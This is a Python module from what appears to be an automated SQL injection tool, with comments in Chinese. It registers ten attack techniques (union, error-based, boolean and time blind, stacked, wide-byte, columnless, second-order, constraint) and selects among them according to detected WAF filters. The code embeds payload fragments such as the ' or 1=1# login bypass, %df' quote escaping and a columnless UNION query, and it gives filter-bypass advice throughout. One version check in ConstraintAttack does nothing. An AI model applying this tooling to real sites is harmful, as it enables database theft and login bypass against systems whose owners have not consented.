"""八大解题方法（+2 引导型），feasible() 依据 WAF 报告与指纹自动裁剪。"""
from __future__ import annotations

from .base import Technique, TechniqueMeta, register
from ..core.models import AnalysisReport
from ..core.oracles import (BaseOracle, BoolOracle, ErrorOracle, OracleError,
                            StackedOracle, TimeOracle, UnionOracle)


def _mk(report: AnalysisReport, cls):
    try:
        return cls(report.session, report.injection, report.builder, report.waf)
    except OracleError:
        return None


@register
class UnionQuery(Technique):
    meta = TechniqueMeta("union", "联合查询注入", "有回显",
                         "ORDER BY 定列数 → UNION SELECT 回显位直读数据，速度最快")

    def feasible(self, report: AnalysisReport):
        fp, waf = report.fingerprint, report.waf
        if not fp.echo_visible:
            return False, "未发现回显位"
        if waf.is_filtered("union", "select"):
            return False, "union/select 关键字被过滤（可考虑堆叠/预处理绕过）"
        if waf.is_filtered("concat"):
            return True, "concat 被过滤，单列直读（无 ~~ 标记拼接）可能受限"
        return True, "存在回显位，最优通道"

    def make_oracle(self, report):
        return _mk(report, UnionOracle)


@register
class ErrorBased(Technique):
    meta = TechniqueMeta("error", "报错注入（XPATH）", "有回显",
                         "updatexml/extractvalue 报错带回数据，32 字符自动分段")

    def feasible(self, report: AnalysisReport):
        fp, waf = report.fingerprint, report.waf
        if not fp.error_visible:
            return False, "页面无 SQL 报错回显"
        if waf.is_filtered("updatexml", "extractvalue"):
            return False, "updatexml 与 extractvalue 均被过滤"
        if waf.is_filtered("concat", "substr"):
            return False, "concat/substr 被过滤，报错通道无法构造"
        return True, "报错回显可见"

    def make_oracle(self, report):
        return _mk(report, ErrorOracle)


@register
class BoolBlind(Technique):
    meta = TechniqueMeta("bool_blind", "布尔盲注", "无回显",
                         "ascii+二分逐字符提取，真假页面最近邻分类，支持并发")

    def feasible(self, report: AnalysisReport):
        fp, waf = report.fingerprint, report.waf
        if not fp.boolean_oracle:
            return False, "真假条件无页面差异"
        if waf.is_filtered("ascii", "ord", "substr", "mid"):
            return False, "ascii/substr 等截取函数被过滤（可尝试 insert/trim 套娃）"
        return True, "布尔差异可用"

    def make_oracle(self, report):
        return _mk(report, BoolOracle)


@register
class TimeBlind(Technique):
    meta = TechniqueMeta("time_blind", "时间盲注", "无回显",
                         "sleep 延时判断真假，最慢的兜底通道")

    def feasible(self, report: AnalysisReport):
        fp, waf = report.fingerprint, report.waf
        if not fp.time_oracle:
            return False, "sleep 延时不可用或未观察到时间差异"
        if waf.is_filtered("ascii", "ord", "substr", "mid"):
            return False, "截取函数被过滤"
        return True, "延时差异可用（速度慢，建议最后选用）"

    def make_oracle(self, report):
        return _mk(report, TimeOracle)


@register
class UniversalPassword(Technique):
    meta = TechniqueMeta("universal", "万能密码", "特殊",
                         "登录表单专用：' or 1=1# 系列直接绕过认证")

    def feasible(self, report: AnalysisReport):
        return True, "登录场景可尝试（对查询型注入点亦可验证恒真条件）"


@register
class Stacked(Technique):
    meta = TechniqueMeta("stacked", "堆叠注入", "特殊",
                         "分号执行任意语句：PREPARE+hex 通用取数 / show tables / handler / rename 换表")

    def feasible(self, report: AnalysisReport):
        fp, waf = report.fingerprint, report.waf
        if waf.is_filtered(";"):
            return False, "分号被过滤"
        if not fp.stacked:
            return False, "后端疑似单语句执行（mysqli_query），堆叠不可用"
        if waf.is_filtered("prepare", "execute"):
            return True, "堆叠可用（prepare 被滤，可走 show/handler 读取）"
        return True, "多语句执行可用：PREPARE+十六进制可绕过一切关键字过滤"

    def make_oracle(self, report):
        return _mk(report, StackedOracle)


@register
class WideByte(Technique):
    meta = TechniqueMeta("widebyte", "宽字节注入", "特殊",
                         "%df 吞掉 addslashes 转义反斜杠，重建引号逃逸（GBK 编码环境）")

    def feasible(self, report: AnalysisReport):
        fp, waf = report.fingerprint, report.waf
        if not waf.is_filtered("'"):
            return False, "单引号未被过滤，无需宽字节"
        if not fp.widebyte:
            return False, "%df' 未引发报错（非 GBK 或无转义）"
        return True, "宽字节逃逸可行"


@register
class Columnless(Technique):
    meta = TechniqueMeta("columnless", "无列名注入", "特殊",
                         "information_schema 被滤时的 UNION 重命名法：select 1,a.2,a.3 from (select 1,2,3 union select * from t)a")

    def feasible(self, report: AnalysisReport):
        fp, waf = report.fingerprint, report.waf
        if not waf.is_filtered("information_schema"):
            return False, "information_schema 可用，常规查列即可"
        if not fp.echo_visible:
            return False, "需要 UNION 回显位"
        if waf.is_filtered("union", "select"):
            return False, "union/select 被过滤"
        return True, "适用：已知表名、information_schema 被滤（需手工提供表名）"


@register
class SecondOrder(Technique):
    meta = TechniqueMeta("second_order", "二次注入（引导）", "特殊",
                         "先存储 payload（注册/改名），再在另一功能触发；依赖业务逻辑，需人工分步")

    def feasible(self, report: AnalysisReport):
        return False, "需要两个业务入口（存储 + 触发），请按笔记流程手工操作"


@register
class ConstraintAttack(Technique):
    meta = TechniqueMeta("constraint", "约束攻击（引导）", "特殊",
                         "超长截断 + 尾空格忽略夺取 admin 账号；需 MySQL 非严格模式")

    def feasible(self, report: AnalysisReport):
        ver = report.fingerprint.version or ""
        major = ver.split(".")[0] if ver else ""
        if major.isdigit() and int(major) >= 5 and "5.7" <= ver[:3] <= "11.":
            pass
        return False, "需非严格模式（STRICT_TRANS_TABLES 关闭）与特定业务逻辑，请手工验证"
